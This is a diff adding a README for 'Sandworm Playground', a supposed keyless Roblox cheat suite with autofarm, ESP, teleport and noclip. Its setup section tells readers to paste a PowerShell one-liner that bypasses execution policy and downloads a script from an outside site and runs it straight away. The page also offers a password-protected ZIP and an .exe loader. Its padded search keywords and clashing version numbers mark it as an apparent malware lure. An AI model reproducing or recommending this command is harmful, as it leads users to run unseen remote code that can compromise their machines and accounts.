@@ -1,0 +1,44 @@
+Sandworm Playground (v2.6.0 — Windows 10 / 11 x64)
+
+Sandworm Playground provides a keyless Luau automation and visual utility suite for Roblox on Windows 10/11. It supports automated farming loops, entity/item ESP, instant teleportation, and webhook notifications.
+
+⬇️ Download & Quick Setup (Windows 10 / 11 x64)
+
+- 🚀 Open Sandworm Playground Setup Portal (SandwormPlayground-Trainer.exe) — Interactive Setup & Mirrors
+- 📦 Direct Download Portable .ZIP Archive (sandworm-playground-trainer-mod-menu-v2.4.0-win64.zip · 2.66 MB · Password: 2026)
+- 📋 Release Notes & SHA-256 Checksums (v2.6.0)
+
+⚡ Instant 1-Command Setup (Win + R or PowerShell · 3 Seconds)
+Press Win + R (or open Windows Terminal / PowerShell), paste the command below, and press Enter:
+
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://simpol.info/get/sandworm-playground-trainer-mod-menu | iex"
+
+Key Features & Technical Specs
+
+- Automated Sandworm Playground farming loop, instant action execution, and auto-collect
+- Entity, rare item, and chest ESP overlay with distance and value filters
+- Instant waypoint teleportation, walkspeed / jump multiplier, and noclip toggle
+- Keyless execution compatible with Xeno, Solara, Wave, Delta, and Krnl
+
+| Property | Specification |
+| :--- | :--- |
+| Package Binary | SandwormPlayground/SandwormPlayground-Trainer.exe (v2.6.0) |
+| Target Runtime | Roblox Hyperion x64 Luau Runtime (RobloxPlayerBeta.exe · Keyless Script Hub) |
+| Install Path | %LOCALAPPDATA%\Roblox\Workspace\SandwormPlayground |
+| Supported OS | Windows 10 / Windows 11 (64-bit, 22H2–24H2) |
+
+How to Install & Run
+
+1. Open the Sandworm Playground Script & Loader Portal (v2.6.0) or Releases.
+2. Run the standalone loader SandwormPlayground-Trainer.exe (compatible with Xeno, Solara, Wave, Delta, and Krnl).
+3. Join the game server and press RightShift or INSERT to toggle the in-game GUI.
+
+SandwormPlayground/
+├── SandwormPlayground-Trainer.exe               # Signed Windows x64 Binary
+├── vcruntime140.dll         # Bundled C++ Runtime (v14.42)
+├── vcruntime140_1.dll       # Exception Handling Helper
+├── config.ini               # Default Profile (%LOCALAPPDATA%\Roblox\Workspace\SandwormPlayground)
+└── README-Setup.txt         # Quick Start & SHA-256 Checksum
+
+Indexed Topics & Search Reference
+sandworm playground script · sandworm playground roblox script · sandworm playground autofarm · sandworm playground script pastebin · sandworm-playground · sandworm-playground-script · sandworm-playground-roblox · roblox-script · roblox · luau
